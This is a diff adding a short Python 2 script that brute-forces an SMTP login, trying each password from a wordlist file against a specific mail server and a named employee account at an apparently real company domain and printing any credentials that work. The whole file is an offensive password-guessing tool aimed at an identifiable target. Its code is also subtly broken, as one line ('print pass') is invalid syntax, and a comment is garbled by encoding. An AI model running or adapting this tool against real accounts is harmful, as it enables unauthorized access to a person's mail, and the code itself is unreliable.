@@ -1,0 +1,31 @@
+#!/usr/bin/env python
+# -*- coding: gbk -*-
+#µº»Îsmtplib∫ÕMIMEText
+import smtplib
+import pprint
+from email.mime.text import MIMEText
+import threading
+import Queue
+import time
+class Fuckmail(object):
+
+    def __init__(self, mailHost, mailUser, mailPwd):
+        self.mailHost = mailHost;
+        self.mailUser = mailUser;
+        self.mailPwd = mailPwd;
+
+    def run(self):
+            try:
+                self.send = smtplib.SMTP()
+                self.send.connect(self.mailHost)
+                self.result = self.send.login(self.mailUser, self.mailPwd)
+                if self.result:
+                    pprint.pprint('[*]--User:'+ self.mailUser + '--Pwd:'+ self.mailPwd + '---[*]---Success')
+            except smtplib.SMTPException as e:
+                print pass
+
+if __name__ == '__main__':
+    with open('userdict.txt', 'r') as f:
+        for pwd in f:
+            p = Fuckmail('smtp.minshengec.cn', 'wangqi@minshengec.cn',pwd.strip())
+            p.run()
